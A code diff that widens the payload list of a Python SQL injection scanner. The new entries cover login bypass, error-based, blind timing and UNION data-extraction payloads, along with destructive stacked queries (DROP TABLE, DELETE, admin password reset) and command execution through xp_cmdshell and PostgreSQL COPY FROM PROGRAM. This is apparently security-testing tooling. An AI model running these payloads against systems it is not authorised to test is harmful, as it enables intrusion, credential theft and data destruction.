@@ -31,23 +31,75 @@ class SQLInjectionScanner:
         self.logger = logger
         self.verbose = verbose
         
-        # SQL injection payloads to test
+        # SQL injection payloads to test - expanded with more aggressive techniques
         self.payloads = [
+            # Basic authentication bypass
             "' OR '1'='1",
             "' OR '1'='1' --",
             "' OR 1=1 --",
             "1' OR '1'='1",
             "admin' --",
-            "1'; DROP TABLE users--",
-            "1' UNION SELECT 1,2,3,4,5--",
-            "' UNION SELECT null,null,null,null,null--",
             "' OR 1=1#",
-            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
-            "') OR '1'='1--",
+            "' OR 1=1/*",
             "') OR ('1'='1--",
-            "1) OR 1=1--",
-            "'; WAITFOR DELAY '0:0:5'--",
-            "1 WAITFOR DELAY '0:0:5'--",
+            "')) OR (('1'='1--",
+            
+            # Error-based SQL injection
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
+            "' AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x3a,(SELECT user()),0x3a,0x3a)) s), 1, 0))-- -",
+            "AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))",
+            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,user(),0x3a)) USING utf8)))",
+            
+            # Time-based blind SQL injection
+            "' AND (SELECT * FROM (SELECT(SLEEP(1)))a) --",
+            "' AND SLEEP(1) --",
+            "' WAITFOR DELAY '0:0:3' --",
+            "1' WAITFOR DELAY '0:0:3' --",
+            "'; WAITFOR DELAY '0:0:3' --",
+            "1); WAITFOR DELAY '0:0:3' --",
+            "'; SELECT pg_sleep(3) --",
+            "'; SELECT SLEEP(3) --",
+            
+            # Union-based SQL injection
+            "' UNION SELECT null,null,null,null,null--",
+            "' UNION SELECT 1,2,3,4,5--",
+            "' UNION SELECT 1,2,3,4,@@version--",
+            "' UNION SELECT username,password,3,4,5 FROM users--",
+            "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
+            "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3a,0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,0x3a)--",
+            
+            # Stacked queries
+            "'; DROP TABLE users--",
+            "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
+            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
+            "'; DELETE FROM users--",
+            
+            # Database specific payloads
+            # MySQL
+            "' OR 1=1 -- -",
+            "' OR 1=1 ORDER BY 10-- -",
+            "' PROCEDURE ANALYSE()-- -",
+            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- -",
+            
+            # SQL Server
+            "' OR 1=1 -- ",
+            "'; EXEC xp_cmdshell('net user')-- ",
+            "'; EXEC master..xp_cmdshell 'net user'-- ",
+            
+            # PostgreSQL
+            "' OR 1=1; -- ",
+            "'; SELECT pg_sleep(5)-- ",
+            "'; CREATE TEMP TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- ",
+            
+            # Oracle
+            "' OR 1=1 -- ",
+            "' UNION SELECT banner FROM v$version-- ",
+            "' UNION SELECT DISTINCT table_name FROM all_tables-- ",
+            
+            # SQLite
+            "' OR 1=1 -- ",
+            "' UNION SELECT sqlite_version()-- ",
+            "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "
         ]
         
         # Error patterns indicating successful SQL injection
